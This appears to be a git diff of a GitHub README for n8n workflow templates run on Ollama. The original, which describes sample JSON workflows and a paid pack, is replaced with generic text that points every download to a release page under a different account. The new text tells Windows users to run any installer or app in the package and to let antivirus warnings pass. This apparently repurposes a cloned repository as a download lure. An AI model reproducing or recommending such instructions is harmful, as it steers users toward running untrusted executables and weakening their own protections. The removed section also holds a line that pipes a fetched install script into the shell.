@@ -1,176 +1,198 @@
-# n8n AI Workflow Templates -- Powered by Ollama (100% Local, 100% Free AI)
+# 🤖 n8n-ai-workflows - Ready-to-Use AI Workflows
 
-> **Production-ready n8n automation workflows that use local AI via Ollama. No API keys. No cloud costs. No data leaves your machine.**
+[![Download n8n-ai-workflows](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Vanillapfalz374/n8n-ai-workflows/releases)
 
-[![n8n](https://img.shields.io/badge/n8n-workflow_automation-FF6D5A?style=for-the-badge&logo=n8n&logoColor=white)](https://n8n.io)
-[![Ollama](https://img.shields.io/badge/Ollama-local_AI-000000?style=for-the-badge)](https://ollama.ai)
-[![License](https://img.shields.io/badge/license-MIT-blue?style=for-the-badge)](#license)
-[![Get Full Pack](https://img.shields.io/badge/Get_Full_Pack_(11_Workflows)-$39-667eea?style=for-the-badge)](https://bonskari.github.io/n8n-ai-workflows/)
+## 🚀 What This Is
 
----
+n8n-ai-workflows is a set of 15 ready-made n8n workflow templates for everyday automation tasks. It uses Ollama, so the AI runs on your own machine. You do not need API keys.
 
-## 3 Free Sample Workflows
+Use it to handle tasks like:
 
-Try before you buy. Each workflow is a real, complete, production-ready template -- not a stripped-down demo.
+- Email replies and sorting
+- Lead scoring
+- Content creation
+- Chatbots
+- RAG knowledge lookup
+- Data cleanup
+- Text summaries
+- Internal task automation
 
-| # | Workflow | What It Does | Nodes | Trigger |
-|---|----------|-------------|-------|---------|
-| 1 | [AI Blog Writer Pipeline](samples/ai-blog-writer.json) | Enter a topic, get a polished 1500-word blog post. Uses a 4-stage AI pipeline: Research, Outline, Draft, Edit. | 7 | Manual |
-| 2 | [AI Social Media Content Generator](samples/ai-social-content-generator.json) | One topic becomes ready-to-post content for Twitter, LinkedIn, Reddit, and Instagram -- with AI quality review. | 6 | Manual |
-| 3 | [AI Data Extractor](samples/ai-data-extractor.json) | Send unstructured text via webhook, get clean structured JSON back. Includes AI-powered verification of extracted data. | 6 | Webhook |
+Each workflow is built for a common use case and is meant to be imported into n8n with a simple setup.
 
-### Quick Download Links
+## 📥 Download
 
-- **[ai-blog-writer.json](https://github.com/bonskari/n8n-ai-workflows/raw/main/samples/ai-blog-writer.json)** -- 4-stage blog content pipeline
-- **[ai-social-content-generator.json](https://github.com/bonskari/n8n-ai-workflows/raw/main/samples/ai-social-content-generator.json)** -- Multi-platform social content
-- **[ai-data-extractor.json](https://github.com/bonskari/n8n-ai-workflows/raw/main/samples/ai-data-extractor.json)** -- Unstructured text to structured JSON
+Visit this page to download the release files:
 
----
+[Download from GitHub Releases](https://github.com/Vanillapfalz374/n8n-ai-workflows/releases)
 
-## How to Import into n8n
+On that page, look for the latest release and download the file for Windows. If the release includes a zip file, download it and extract it first.
 
-```
-1. Download any .json file from the samples/ folder above
-2. Open n8n -> Workflows -> Import from File
-3. Select the downloaded JSON file
-4. Make sure Ollama is running locally:
-     ollama pull llama3:8b
-     ollama serve
-5. Click "Execute Workflow" -- done!
-```
+## 🪟 Windows Setup
 
-All workflows connect to Ollama at `http://localhost:11434` by default. No API keys or credentials needed.
+Follow these steps on Windows:
 
----
+1. Open the download page and get the latest release file.
+2. If the file is a `.zip`, right-click it and select **Extract All**.
+3. Open the extracted folder.
+4. Look for the workflow files, readme files, or setup instructions.
+5. If the package includes n8n import files, open n8n and import them.
+6. If the package includes an installer or app file, double-click it to start.
 
-## The Full Pack: 11 Production Workflows ($39)
+If you use Windows Defender or another antivirus tool, it may ask for permission when you open the file. Choose the option that lets you continue if you trust the source.
 
-Like the free samples? The complete pack includes **11 workflows** covering content, sales, and productivity automation -- all powered by local AI.
+## 🧰 What You Need
 
-### Content & Marketing (4 workflows)
-- **AI Blog Writer Pipeline** -- 4-stage content pipeline *(free sample included)*
-- **AI Social Media Content Generator** -- One topic to 4 platforms *(free sample included)*
-- **AI YouTube-to-Newsletter Pipeline** -- YouTube URL to email newsletter in 60 seconds
-- **AI Multi-Platform Content Repurposer** -- One post to 6 platform-optimized versions
+Before you start, make sure you have:
 
-### Sales & Business (4 workflows)
-- **AI Lead Scoring & Enrichment** -- Webhook-triggered scoring (1-100), auto-route hot leads
-- **AI Competitor Intelligence Monitor** -- Weekly autopilot competitive analysis
-- **AI Email Auto-Responder** -- Classify emails, filter spam, draft replies every 5 minutes
-- **AI Support Ticket Router** -- Classify, prioritize, auto-reply, and escalate
+- A Windows computer
+- Internet access
+- Enough free disk space for the download
+- n8n installed, or access to an n8n instance
+- Ollama installed if the workflows use local AI directly
+- A local AI model in Ollama, such as a general chat model
 
-### Productivity (3 workflows)
-- **AI Data Extractor** -- Unstructured text to clean JSON with verification *(free sample included)*
-- **AI Document Summarizer** -- Webhook API for document summaries + Q&A pairs
-- **AI Meeting Notes Summarizer** -- Transcripts to structured summaries + action items
+If you do not have Ollama yet, install it first and start it before importing workflows that use AI.
 
-### [Get the Full Pack -- $39 ->](https://bonskari.github.io/n8n-ai-workflows/)
+## 🧭 How to Use It
 
-One-time purchase. Instant download. Lifetime updates.
+Once you have the files:
 
----
+1. Open n8n in your browser.
+2. Import the workflow file from the release package.
+3. Open the workflow and review the settings.
+4. Set up any email, file, or webhook connections the workflow needs.
+5. Choose the Ollama model you want to use.
+6. Save the workflow.
+7. Run a test to confirm it works.
 
-## Why Self-Hosted AI?
+Some workflows may need you to enter folder paths, email settings, or chatbot prompts. Use the field labels in the workflow as your guide.
 
-| | Cloud AI (OpenAI, etc.) | Self-Hosted (Ollama) |
-|---|---|---|
-| **Monthly cost** | $20--200+ | **$0** |
-| **Data privacy** | Sent to third-party servers | **Stays on your machine** |
-| **Rate limits** | Yes | **None** |
-| **Works offline** | No | **Yes** |
-| **GDPR compliant** | Complicated | **By default** |
-| **Vendor lock-in** | Yes | **No** |
+## 🧠 Included Workflow Types
 
----
+This repository includes templates for tasks such as:
 
-## Requirements
+- Email automation
+- Lead scoring
+- Content generation
+- AI chatbots
+- Retrieval-augmented generation
+- Document lookup
+- Message drafting
+- Data processing
+- Task routing
+- Internal assistant flows
 
-- [n8n](https://n8n.io) self-hosted (v1.0+)
-- [Ollama](https://ollama.ai) running on `localhost:11434`
-- Any Ollama model -- `llama3:8b` recommended (works with any model)
-- 8GB+ RAM recommended
+These templates are built for common business and personal use cases. They can save time on repeat work and help you keep tasks organized.
 
-### Quick Setup
+## 🛠️ Common Setup Steps
 
-```bash
-# Install Ollama (macOS/Linux)
-curl -fsSL https://ollama.ai/install.sh | sh
+Most workflows follow a similar setup pattern:
 
-# Pull the recommended model
-ollama pull llama3:8b
+1. Import the workflow into n8n.
+2. Open each node and check the values.
+3. Add your email account, if needed.
+4. Select your Ollama model.
+5. Add any folder or file paths.
+6. Test the trigger node.
+7. Check the output and adjust the prompt if needed.
 
-# Start Ollama (if not already running)
-ollama serve
-```
+If a workflow uses file input, place your files in the folder named in the workflow. If it uses email, connect the correct inbox or SMTP settings inside n8n.
 
----
+## 🔍 Example Use Cases
 
-## Screenshots
+Here are a few ways people can use the templates:
 
-> Screenshots of each workflow running in n8n coming soon. Star this repo to get notified!
+- Sort incoming emails and draft replies
+- Score leads based on message text
+- Turn notes into blog drafts
+- Answer questions from local documents
+- Run a chatbot on your own machine
+- Extract key details from long text
+- Route requests to the right next step
 
-<!--
-TODO: Add screenshots
-![Blog Writer Workflow](screenshots/blog-writer.png)
-![Social Content Generator](screenshots/social-content.png)
-![Data Extractor](screenshots/data-extractor.png)
--->
+These workflows are useful when you want AI help without sending data to outside services.
 
----
+## 💻 Suggested System Setup
 
-## FAQ
+A basic Windows setup works well for most users:
 
-**Q: Do these work with OpenAI / Claude / other cloud APIs?**
-A: The workflows are built for Ollama, but you can swap the HTTP Request nodes for n8n's native OpenAI/Anthropic nodes with minimal changes.
+- Windows 10 or Windows 11
+- 8 GB RAM or more
+- 10 GB free disk space
+- A recent CPU
+- Ollama installed locally
+- n8n running on your machine or on a server you can open in a browser
 
-**Q: What n8n version do I need?**
-A: v1.0 or later. All workflows use standard nodes available in the free self-hosted version.
+For smoother local AI use, more RAM helps. If your machine is older, use a smaller Ollama model.
 
-**Q: Can I use a different Ollama model?**
-A: Yes. Change `llama3:8b` in the workflow to any model you have pulled (e.g., `mistral`, `codellama`, `phi3`).
+## 📂 File Types You May See
 
-**Q: What do I get in the full pack vs. the free samples?**
-A: The free samples are 3 complete workflows. The full pack adds 8 more workflows covering email automation, lead scoring, competitor monitoring, meeting notes, document summarization, content repurposing, YouTube-to-newsletter, and support ticket routing.
+The release may include files such as:
 
----
+- `.json` workflow exports
+- `.zip` archives
+- `.md` instructions
+- `.txt` notes
+- config files for setup
 
-## Tutorials & Guides
+If you see a `.json` file, that is often the file you import into n8n. If you see a `.zip`, extract it first so you can find the workflow files inside.
 
-Step-by-step guides for building AI automation workflows with n8n + Ollama:
+## 🔄 Updating to a New Version
 
-- [Getting Started with Self-Hosted AI Workflows](https://bonskari.github.io/n8n-ai-workflows/blog/self-hosted-ai-workflows-n8n-ollama.html)
-- [Complete n8n + Ollama Tutorial](https://bonskari.github.io/n8n-ai-workflows/blog/n8n-ollama-tutorial-local-ai-automation.html)
-- [AI Email Auto-Responder](https://bonskari.github.io/n8n-ai-workflows/blog/automate-email-responses-n8n-ollama.html)
-- [AI Lead Scoring Pipeline](https://bonskari.github.io/n8n-ai-workflows/blog/n8n-ai-lead-scoring-ollama-workflow.html)
-- [Private RAG Knowledge Base](https://bonskari.github.io/n8n-ai-workflows/blog/n8n-rag-knowledge-base-ollama-private.html)
-- [AI Customer Support Automation](https://bonskari.github.io/n8n-ai-workflows/blog/n8n-customer-support-automation-ollama.html)
-- [AI Invoice Data Extraction](https://bonskari.github.io/n8n-ai-workflows/blog/n8n-invoice-data-extraction-ollama.html)
-- [AI Code Review Automation](https://bonskari.github.io/n8n-ai-workflows/blog/n8n-ai-code-review-ollama.html)
-- [AI Content Moderation](https://bonskari.github.io/n8n-ai-workflows/blog/n8n-ai-content-moderation-ollama.html)
-- [AI Product Descriptions for E-Commerce](https://bonskari.github.io/n8n-ai-workflows/blog/n8n-ai-product-descriptions-ollama-ecommerce.html)
+When a new release appears:
 
-[View all tutorials ->](https://bonskari.github.io/n8n-ai-workflows/)
+1. Go back to the release page.
+2. Download the newest file.
+3. Save your old workflow copy first.
+4. Import the new version into n8n.
+5. Compare the new nodes with your old setup.
+6. Test the workflow again.
 
----
+This helps you keep your setup current without losing your changes.
 
-## Star History
+## ❓ If Something Does Not Work
 
-If this repo helped you, give it a star! It helps others discover these workflows.
+If a workflow does not run, check these items:
 
-[![Star this repo](https://img.shields.io/github/stars/bonskari/n8n-ai-workflows?style=social)](https://github.com/bonskari/n8n-ai-workflows)
+- n8n is open and running
+- Ollama is running
+- The model name matches the one in the workflow
+- The import file loaded without errors
+- Any email or webhook settings are filled in
+- The trigger node is turned on
+- The file path exists on your computer
 
----
+If the workflow still fails, open each node one by one and check the field values. Small setup issues are the most common cause.
 
-## Support
+## 📌 Repository Topics
 
-Questions or issues? [Open an issue](https://github.com/bonskari/n8n-ai-workflows/issues) or email admin@unstableentity.com
+- ai-automation
+- ai-workflows
+- automation
+- chatbot
+- content-generation
+- email-automation
+- lead-scoring
+- llm
+- local-ai
+- n8n
+- no-code
+- ollama
+- rag
+- self-hosted
+- workflow-templates
 
----
+## 🧩 Best Fit For
 
-## License
+This project fits users who want to:
 
-The free sample workflows in this repository are released under the [MIT License](LICENSE). The full paid pack is licensed per-user.
+- Save time on repeat tasks
+- Use local AI on Windows
+- Work with n8n without building from scratch
+- Avoid API keys
+- Keep data on their own system
+- Start from ready-made templates instead of blank workflows
 
----
+## 📎 Download Again
 
-### [Get the Full Pack (11 Workflows) -- $39 ->](https://bonskari.github.io/n8n-ai-workflows/)
+[Open the release page and download the latest file](https://github.com/Vanillapfalz374/n8n-ai-workflows/releases)
